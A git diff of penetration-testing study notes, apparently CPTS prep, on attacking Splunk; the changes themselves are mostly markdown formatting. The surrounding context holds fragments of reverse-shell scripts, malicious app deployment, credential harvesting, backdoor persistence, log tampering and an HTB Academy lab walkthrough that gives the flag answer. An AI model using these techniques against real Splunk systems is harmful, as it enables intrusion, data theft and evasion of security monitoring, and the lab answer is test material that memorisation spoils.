@@ -7,26 +7,29 @@
 Splunk exploitation represents one of the **highest-impact attack vectors** in enterprise environments, providing access to **sensitive security data**, **comprehensive organizational logs**, and **SYSTEM/root execution privileges**. With Splunk commonly running with **elevated privileges** for log collection and **containing critical security intelligence**, successful exploitation can lead to **complete SIEM compromise**, **data exfiltration**, and **lateral movement** throughout enterprise networks.
 
 **Critical Attack Vectors:**
-- **Custom Application Deployment** - Malicious Splunk app installation for RCE
-- **Scripted Input Abuse** - Python/PowerShell/Bash script execution through data inputs
-- **Universal Forwarder Compromise** - Lateral movement through deployment server control
-- **Data Exfiltration** - Access to logs, security events, and business intelligence
-- **Privilege Escalation** - SYSTEM/root context exploitation for infrastructure control
+
+* **Custom Application Deployment** - Malicious Splunk app installation for RCE
+* **Scripted Input Abuse** - Python/PowerShell/Bash script execution through data inputs
+* **Universal Forwarder Compromise** - Lateral movement through deployment server control
+* **Data Exfiltration** - Access to logs, security events, and business intelligence
+* **Privilege Escalation** - SYSTEM/root context exploitation for infrastructure control
 
 **Enterprise Impact:**
-- **SIEM Infrastructure Control** - Complete access to security monitoring and alerting systems
-- **Sensitive Data Access** - Security logs, user activities, network traffic, compliance data
-- **Lateral Movement Capability** - Universal Forwarder network for endpoint compromise
-- **Security Monitoring Bypass** - Ability to manipulate logs and disable security alerting
-- **Compliance Violation** - Access to regulated data and audit trail manipulation
 
----
+* **SIEM Infrastructure Control** - Complete access to security monitoring and alerting systems
+* **Sensitive Data Access** - Security logs, user activities, network traffic, compliance data
+* **Lateral Movement Capability** - Universal Forwarder network for endpoint compromise
+* **Security Monitoring Bypass** - Ability to manipulate logs and disable security alerting
+* **Compliance Violation** - Access to regulated data and audit trail manipulation
+
+***
 
 ## Custom Application Exploitation
 
 ### Malicious Splunk Application Development
 
 #### Application Structure and Components
+
 ```bash
 # Standard Splunk application directory structure
 splunk_malicious_app/
@@ -46,6 +49,7 @@ splunk_malicious_app/
 ```
 
 #### Python Reverse Shell Implementation
+
 ```python
 #!/usr/bin/env python3
 # bin/reverse_shell.py - Python reverse shell for Splunk exploitation
@@ -141,6 +145,7 @@ if __name__ == "__main__":
 ```
 
 #### PowerShell Reverse Shell Implementation
+
 ```powershell
 # bin/reverse_shell.ps1 - PowerShell reverse shell for Windows Splunk exploitation
 
@@ -284,6 +289,7 @@ Invoke-AdvancedReverseShell -IP $AttackerIP -Port $AttackerPort
 ```
 
 #### Batch File Launcher (Windows)
+
 ```batch
 @ECHO OFF
 REM bin/run.bat - Windows batch launcher for PowerShell reverse shell
@@ -304,6 +310,7 @@ EXIT /B
 ### Application Configuration Files
 
 #### inputs.conf - Script Execution Configuration
+
 ```ini
 # default/inputs.conf - Splunk input configuration for script execution
 
@@ -336,6 +343,7 @@ sourcetype = python_execution
 ```
 
 #### app.conf - Application Metadata
+
 ```ini
 # default/app.conf - Application configuration and metadata
 
@@ -358,6 +366,7 @@ check_for_updates = false
 ```
 
 #### Application Permissions (default.meta)
+
 ```ini
 # metadata/default.meta - Application permissions and access control
 
@@ -381,6 +390,7 @@ export = system
 ### Application Deployment Process
 
 #### Manual Application Creation
+
 ```bash
 # Create malicious Splunk application structure
 create_malicious_app() {
@@ -484,6 +494,7 @@ EOF
 ```
 
 #### Application Packaging
+
 ```bash
 # Package Splunk application for deployment
 package_splunk_app() {
@@ -511,13 +522,14 @@ package_splunk_app() {
 # package_splunk_app "system_updater"
 ```
 
----
+***
 
 ## Web-Based Application Deployment
 
 ### Splunk Web Interface Exploitation
 
 #### Application Upload Process
+
 ```bash
 # Automated application upload via web interface
 upload_malicious_app() {
@@ -578,6 +590,7 @@ upload_malicious_app() {
 ```
 
 #### Manual Web Interface Steps
+
 ```bash
 # Manual application deployment process:
 echo "[+] Manual Splunk application deployment steps:"
@@ -598,6 +611,7 @@ echo "   - Shell executes with Splunk service account privileges (often SYSTEM/r
 ```
 
 ### Post-Upload Verification
+
 ```bash
 # Verify application deployment and execution
 verify_deployment() {
@@ -631,13 +645,14 @@ verify_deployment() {
 # verify_deployment "http://target.com:8000" "system_updater"
 ```
 
----
+***
 
 ## Universal Forwarder Exploitation
 
 ### Deployment Server Compromise
 
 #### Forwarder Network Discovery
+
 ```bash
 # Discover and enumerate Universal Forwarders
 discover_forwarders() {
@@ -668,6 +683,7 @@ discover_forwarders() {
 ```
 
 #### Deployment Application Creation
+
 ```bash
 # Create application for Universal Forwarder deployment
 create_deployment_app() {
@@ -752,6 +768,7 @@ EOF
 ```
 
 #### Forwarder Mass Deployment
+
 ```bash
 # Deploy malicious application to all Universal Forwarders
 deploy_to_forwarders() {
@@ -787,16 +804,18 @@ deploy_to_forwarders() {
 # deploy_to_forwarders "http://deployment-server:8000" "security_update"
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Lab 1: Splunk RCE and Flag Retrieval
+
 **Question:** "Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory."
 
 **Solution Methodology:**
 
 #### Step 1: Environment Setup and Authentication
+
 ```bash
 # Verify Splunk accessibility
 curl -I http://10.129.201.50:8000/
@@ -811,6 +830,7 @@ curl -c cookies.txt -d "username=admin&password=changeme" \
 ```
 
 #### Step 2: Malicious Application Creation
+
 ```bash
 # Create Windows-specific malicious Splunk application
 mkdir -p splunk_rce/{bin,default}
@@ -851,6 +871,7 @@ tar -czf splunk_rce.tar.gz splunk_rce/
 ```
 
 #### Step 3: Application Deployment
+
 ```bash
 # Setup netcat listener (in separate terminal)
 nc -lvnp 4443
@@ -864,6 +885,7 @@ nc -lvnp 4443
 ```
 
 #### Step 4: Reverse Shell and Flag Retrieval
+
 ```bash
 # Once reverse shell is established:
 # Expected connection within 10 seconds of upload
@@ -887,6 +909,7 @@ type flag.txt
 ```
 
 #### Step 5: Alternative Method - Direct Command Execution
+
 ```bash
 # If reverse shell method fails, create command execution app
 cat > splunk_cmd/bin/cmd.py << 'EOF'
@@ -923,6 +946,7 @@ EOF
 ### 🎯 HTB Academy Lab Summary
 
 **Complete Lab Methodology:**
+
 1. **Service Identification** - Nmap scan reveals Splunk on port 8000/8089
 2. **Authentication Assessment** - Test for unauthenticated access or default credentials
 3. **Malicious Application Creation** - PowerShell reverse shell with batch launcher
@@ -932,15 +956,17 @@ EOF
 7. **Flag Retrieval** - Read c:\loot\flag.txt with SYSTEM privileges
 
 **Key Technical Steps:**
-- **Scripted Input Abuse** - Splunk's built-in script execution capability
-- **PowerShell Payload** - Windows-specific reverse shell implementation
-- **Batch File Wrapper** - Execution policy bypass for PowerShell
-- **Automatic Execution** - Interval-based script execution (10 seconds)
-- **SYSTEM Privileges** - Splunk service runs with highest privileges
+
+* **Scripted Input Abuse** - Splunk's built-in script execution capability
+* **PowerShell Payload** - Windows-specific reverse shell implementation
+* **Batch File Wrapper** - Execution policy bypass for PowerShell
+* **Automatic Execution** - Interval-based script execution (10 seconds)
+* **SYSTEM Privileges** - Splunk service runs with highest privileges
 
 #### 🔧 Practical Lab Walkthrough
 
 **Repository Setup:**
+
 ```bash
 # Clone pre-built reverse shell application
 git clone https://github.com/0xjpuff/reverse_shell_splunk.git
@@ -951,6 +977,7 @@ cd reverse_shell_splunk/reverse_shell_splunk/bin
 ```
 
 **Application Deployment:**
+
 ```bash
 # Package application for upload
 tar -cvzf updater.tar.gz reverse_shell_splunk/
@@ -960,6 +987,7 @@ nc -nvlp 9001
 ```
 
 **Web Interface Steps:**
+
 1. Navigate to `https://STMIP:8000`
 2. Click "Manage Apps"
 3. Select "Install app from file"
@@ -967,6 +995,7 @@ nc -nvlp 9001
 5. Reverse shell connects automatically as `nt authority\system`
 
 **Flag Retrieval:**
+
 ```powershell
 # In reverse shell session
 cat C:\loot\flag.txt
@@ -975,13 +1004,14 @@ cat C:\loot\flag.txt
 
 **HTB Academy Answer:** `l00k_ma_no_AutH!`
 
----
+***
 
 ## Data Exfiltration and Intelligence Gathering
 
 ### Sensitive Data Discovery
 
 #### Log Data Analysis and Extraction
+
 ```bash
 # Comprehensive data exfiltration from Splunk indexes
 extract_sensitive_data() {
@@ -1024,6 +1054,7 @@ extract_sensitive_data() {
 ```
 
 #### Configuration and Credential Harvesting
+
 ```bash
 # Extract Splunk configuration and stored credentials
 harvest_splunk_configs() {
@@ -1074,13 +1105,14 @@ harvest_splunk_configs() {
 # harvest_splunk_configs "http://target.com:8000"
 ```
 
----
+***
 
 ## Post-Exploitation and Persistence
 
 ### Splunk Infrastructure Persistence
 
 #### Persistent Application Installation
+
 ```bash
 # Install persistent backdoor application
 install_persistent_backdoor() {
@@ -1201,6 +1233,7 @@ EOF
 ```
 
 #### Log Tampering and Anti-Forensics
+
 ```bash
 # Splunk log manipulation and anti-forensics
 splunk_anti_forensics() {
@@ -1241,13 +1274,14 @@ splunk_anti_forensics() {
 # splunk_anti_forensics "http://target.com:8000"
 ```
 
----
+***
 
 ## Defense Evasion and Operational Security
 
 ### Stealth Application Development
 
 #### Low-Profile Application Design
+
 ```bash
 # Create stealth application with minimal detection footprint
 create_stealth_app() {
@@ -1337,39 +1371,43 @@ EOF
 # create_stealth_app
 ```
 
----
+***
 
 ## Professional Assessment Integration
 
 ### Splunk Security Assessment Workflow
 
 #### Discovery Phase
-- [ ] **Service Identification** - Port scanning and Splunk service detection
-- [ ] **Version Detection** - REST API and web interface analysis
-- [ ] **License Assessment** - Free vs Enterprise authentication requirements
-- [ ] **Authentication Testing** - Default credentials and bypass techniques
+
+* [ ] **Service Identification** - Port scanning and Splunk service detection
+* [ ] **Version Detection** - REST API and web interface analysis
+* [ ] **License Assessment** - Free vs Enterprise authentication requirements
+* [ ] **Authentication Testing** - Default credentials and bypass techniques
 
 #### Exploitation Phase
-- [ ] **Application Deployment** - Malicious Splunk app creation and upload
-- [ ] **Scripted Input Abuse** - Python/PowerShell script execution
-- [ ] **Universal Forwarder Compromise** - Deployment server exploitation
-- [ ] **Data Exfiltration** - Sensitive log data and configuration extraction
+
+* [ ] **Application Deployment** - Malicious Splunk app creation and upload
+* [ ] **Scripted Input Abuse** - Python/PowerShell script execution
+* [ ] **Universal Forwarder Compromise** - Deployment server exploitation
+* [ ] **Data Exfiltration** - Sensitive log data and configuration extraction
 
 #### Post-Exploitation Phase
-- [ ] **Persistence Establishment** - Backdoor application installation
-- [ ] **Log Manipulation** - Audit trail tampering and anti-forensics
-- [ ] **Lateral Movement** - Universal Forwarder network exploitation
-- [ ] **Intelligence Gathering** - SIEM data and security monitoring bypass
 
----
+* [ ] **Persistence Establishment** - Backdoor application installation
+* [ ] **Log Manipulation** - Audit trail tampering and anti-forensics
+* [ ] **Lateral Movement** - Universal Forwarder network exploitation
+* [ ] **Intelligence Gathering** - SIEM data and security monitoring bypass
+
+***
 
 ## Next Steps
 
 After Splunk exploitation mastery:
-1. **[PRTG Network Monitor Attacks](prtg-attacks.md)** - Infrastructure monitoring exploitation
-2. **[SIEM Security Assessment](siem-security.md)** - Advanced log analytics platform attacks
-3. **[Nagios/Zabbix Exploitation](nagios-zabbix-attacks.md)** - Network monitoring system compromise
+
+1. [**PRTG Network Monitor Attacks**](prtg-attacks.md) - Infrastructure monitoring exploitation
+2. [**SIEM Security Assessment**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/siem-security.md) - Advanced log analytics platform attacks
+3. [**Nagios/Zabbix Exploitation**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/nagios-zabbix-attacks.md) - Network monitoring system compromise
 
 **💡 Key Takeaway:** Splunk exploitation provides **comprehensive access to organizational security data** with **SYSTEM/root privileges** and **lateral movement capabilities**. Master **custom application deployment**, **scripted input abuse**, and **Universal Forwarder compromise** for **complete SIEM infrastructure control** and **sensitive data exfiltration**.
 
-**⚔️ Professional Impact:** Splunk compromises often lead to **complete security monitoring bypass**, **access to all organizational logs**, **compliance violation opportunities**, and **enterprise-wide lateral movement** through **Universal Forwarder networks**, making these skills **critical for advanced penetration testing** in **enterprise SIEM environments**. 
+**⚔️ Professional Impact:** Splunk compromises often lead to **complete security monitoring bypass**, **access to all organizational logs**, **compliance violation opportunities**, and **enterprise-wide lateral movement** through **Universal Forwarder networks**, making these skills **critical for advanced penetration testing** in **enterprise SIEM environments**.
